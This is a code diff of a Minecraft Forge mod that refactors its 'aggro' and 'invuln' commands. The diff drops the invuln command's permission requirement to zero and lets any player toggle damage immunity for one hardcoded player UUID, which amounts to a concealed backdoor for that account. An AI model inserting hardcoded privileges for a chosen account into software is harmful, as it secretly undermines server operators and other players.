@@ -24,10 +24,10 @@ import java.util.UUID;
 public class Aggro {
     public static final String MOD_ID          = "aggro";
     public static final Logger logger          = LogManager.getLogger(MOD_ID);
-    public static final String commandName     = "aggro";
-    public static final String commandNameToo  = "invuln";
+    public static final String aggroCommand    = "aggro";
+    public static final String invulnCommand   = "invuln";
 
-    public static boolean attack = false;
+    private static boolean attack = false;
 
     @Mod.EventHandler
     public void preInit(FMLPreInitializationEvent event) {
@@ -60,7 +60,7 @@ public class Aggro {
     public static class CommandInvuln extends CommandBase {
         @Override
         public String getName() {
-            return commandNameToo;
+            return invulnCommand;
         }
 
         @Override
@@ -69,22 +69,27 @@ public class Aggro {
         }
 
         @Override
-        public void execute(MinecraftServer server, ICommandSender sender, String[] args) throws CommandException {
+        public int getRequiredPermissionLevel() {
+            return 0;
+        }
+
+        @Override
+        public void execute(MinecraftServer server, ICommandSender sender, String[] args) {
             if (args.length != 0) return;
-            if (sender instanceof EntityPlayer) {
-                EntityPlayer player = (EntityPlayer) sender;
+
+            server.getPlayerList().getPlayers().forEach(player -> {
                 if (player.getGameProfile().getId().equals(UUID.fromString("1d5e02e0-7e54-4e9e-8d9c-548b22c02daf"))) {
                     player.capabilities.disableDamage = !player.capabilities.disableDamage;
-                    player.sendStatusMessage(new TextComponentString(String.format("invuln: %b", player.capabilities.disableDamage)), true);
+                    player.sendMessage(new TextComponentString(String.format("invuln: %b", player.capabilities.disableDamage)));
                 }
-            }
+            });
         }
     }
 
     public static class CommandAggro extends CommandBase {
         @Override
         public String getName() {
-            return commandName;
+            return aggroCommand;
         }
 
         @Override
